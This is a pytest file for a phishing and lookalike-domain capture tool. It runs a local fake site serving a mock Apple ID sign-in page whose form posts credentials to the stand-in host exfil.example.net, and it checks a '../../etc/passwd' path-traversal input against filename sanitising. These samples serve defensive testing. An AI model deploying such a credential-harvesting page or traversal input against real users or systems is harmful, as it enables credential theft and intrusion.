"""Capture tests. The browser-backed ones skip when Chromium is not installed."""

from __future__ import annotations

import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from lookalike_hunter.capture.browser import BrowserCapturer, classify_error, safe_dirname
from lookalike_hunter.capture.models import CaptureStatus
from lookalike_hunter.config import CaptureConfig

PHISHING_PAGE = b"""<html><head><title>Apple ID - Sign in</title></head>
<body><h1>Sign in to iCloud</h1>
<form action="https://exfil.example.net/steal" method="post">
<input type="text" name="appleid"><input type="password" name="password">
</form>
<script>document.body.dataset.rendered = "yes";</script>
</body></html>"""


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PHISHING_PAGE)

    def log_message(self, *args: object) -> None:
        pass


@pytest.fixture
def fake_site() -> Iterator[int]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()


def chromium_available() -> bool:
    from playwright._impl._driver import compute_driver_executable

    return Path(compute_driver_executable()[0]).exists()


needs_chromium = pytest.mark.skipif(not chromium_available(), reason="chromium not installed")


@pytest.mark.parametrize(
    ("fqdn", "expected"),
    [
        ("Paypa1-Login.com", "paypa1-login.com"),
        ("xn--pypal-4ve.com", "xn--pypal-4ve.com"),
        ("../../etc/passwd", "etc_passwd"),
        ("host:8080", "host_8080"),
    ],
)
def test_safe_dirname_cannot_escape_the_output_directory(fqdn: str, expected: str) -> None:
    assert safe_dirname(fqdn) == expected
    assert "/" not in safe_dirname(fqdn) and "\\" not in safe_dirname(fqdn)


@pytest.mark.parametrize(
    ("message", "status"),
    [
        ("net::ERR_NAME_NOT_RESOLVED at https://x/", CaptureStatus.DNS_ERROR),
        ("net::ERR_CONNECTION_REFUSED", CaptureStatus.CONNECTION_ERROR),
        ("net::ERR_CERT_AUTHORITY_INVALID", CaptureStatus.CONNECTION_ERROR),
        ("something else entirely", CaptureStatus.ERROR),
    ],
)
def test_classify_error(message: str, status: CaptureStatus) -> None:
    assert classify_error(message) is status


@needs_chromium
async def test_capture_blocks_private_addresses(tmp_path: Path, fake_site: int) -> None:
    config = CaptureConfig(output_dir=tmp_path, timeout_s=10)
    async with BrowserCapturer(config) as capturer:
        result = await capturer.capture(f"127.0.0.1:{fake_site}")

    assert result.status is CaptureStatus.BLOCKED
    assert result.screenshot_path is None
    assert not list(tmp_path.iterdir())


@needs_chromium
async def test_capture_collects_screenshot_html_and_signals(tmp_path: Path, fake_site: int) -> None:
    # Private blocking off: the fake site is on loopback on purpose.
    config = CaptureConfig(output_dir=tmp_path, timeout_s=10, block_private_networks=False)
    async with BrowserCapturer(config) as capturer:
        result = await capturer.capture(f"127.0.0.1:{fake_site}")

    assert result.status is CaptureStatus.OK
    assert result.http_status == 200
    assert result.screenshot_path is not None and result.screenshot_path.stat().st_size > 1000
    assert result.html_path is not None
    assert result.signals is not None
    assert result.signals.title == "Apple ID - Sign in"
    assert result.signals.has_login_form
    assert result.signals.cross_domain_form_targets == ["example.net"]
    # JavaScript must run: kits render their fake login client-side.
    assert 'data-rendered="yes"' in result.html_path.read_text(encoding="utf-8")


@needs_chromium
async def test_capture_reports_dns_failure_without_crashing(tmp_path: Path) -> None:
    config = CaptureConfig(output_dir=tmp_path, timeout_s=10)
    async with BrowserCapturer(config) as capturer:
        result = await capturer.capture("this-domain-does-not-exist-lh-test.invalid")

    assert result.status is CaptureStatus.DNS_ERROR
    assert result.error
